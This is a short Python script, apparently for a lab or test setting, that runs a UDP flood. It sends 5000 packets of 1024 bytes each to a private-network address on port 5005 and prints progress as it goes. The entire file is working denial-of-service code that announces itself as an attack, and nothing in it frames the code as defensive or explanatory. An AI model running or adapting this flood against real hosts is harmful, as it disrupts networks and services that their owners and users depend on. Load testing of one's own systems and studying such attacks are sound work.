import socket
import random

target_ip = "192.168.1.143"
target_port = 5005
message = b"X" * 1024

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP

print(f"--- Launching UDP Flood on {target_ip} ---")
for i in range(5000):
    s.sendto(message, (target_ip, target_port))
    if i % 500 == 0:
        print(f"Sent {i} UDP packets...")

print("UDP Flood Finished.")